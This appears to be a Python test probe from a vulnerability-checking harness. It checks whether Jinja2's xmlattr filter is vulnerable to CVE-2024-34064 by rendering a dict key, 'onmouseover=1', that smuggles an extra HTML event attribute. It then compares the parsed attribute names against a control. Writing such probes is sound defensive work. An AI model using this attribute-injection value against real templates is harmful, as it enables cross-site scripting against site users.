"""CVE-2024-34064 -- Jinja2 xmlattr accepts '=' and '/' in a key (3.1.3 -> 3.1.4).

The sibling of CVE-2024-22195 and deliberately not the same payload: 3.1.3
already rejects whitespace, so this probe's key contains none. The oracle is the
same parse-the-attribute-names check, which is what lets the two targets be
scored separately without one standing in for the other.
"""

from __future__ import annotations

import os

from ._support import attribute_names, pinned_version

DIST = "Jinja2"
MODULE = "jinja2"

#: No whitespace anywhere: 3.1.3 lets this through, 3.1.4 rejects the '='.
_HOSTILE_KEY = "onmouseover=1"
_TEMPLATE = "<a {{ d|xmlattr }}>x</a>"
_LEGITIMATE = {"href"}


def _render(key: str) -> tuple[set[str], str]:
    import jinja2

    env = jinja2.Environment(autoescape=True)
    out = env.from_string(_TEMPLATE).render(d={"href": "/ok", key: "z"})
    return set(attribute_names(out)), out


def liveness(ctx: dict) -> tuple[bool, str]:
    origin = pinned_version(DIST, MODULE, ctx["version"], ctx["pin_dir"])
    names, out = _render("title")
    ok = names == {"href", "title"}
    return ok, f"benign render -> {sorted(names)} from {os.path.basename(origin)}; {out!r}"


def control(ctx: dict) -> tuple[bool, str]:
    names, out = _render("data-id")
    extra = names - _LEGITIMATE - {"data-id"}
    return bool(extra), f"benign key, unexpected attributes={sorted(extra)}; {out!r}"


def exploit(ctx: dict) -> tuple[bool, str]:
    try:
        names, out = _render(_HOSTILE_KEY)
    except ValueError as exc:
        return False, f"refused by the filter: ValueError: {exc}"
    extra = names - _LEGITIMATE
    return bool(extra), f"injected attribute names={sorted(extra)}; {out!r}"
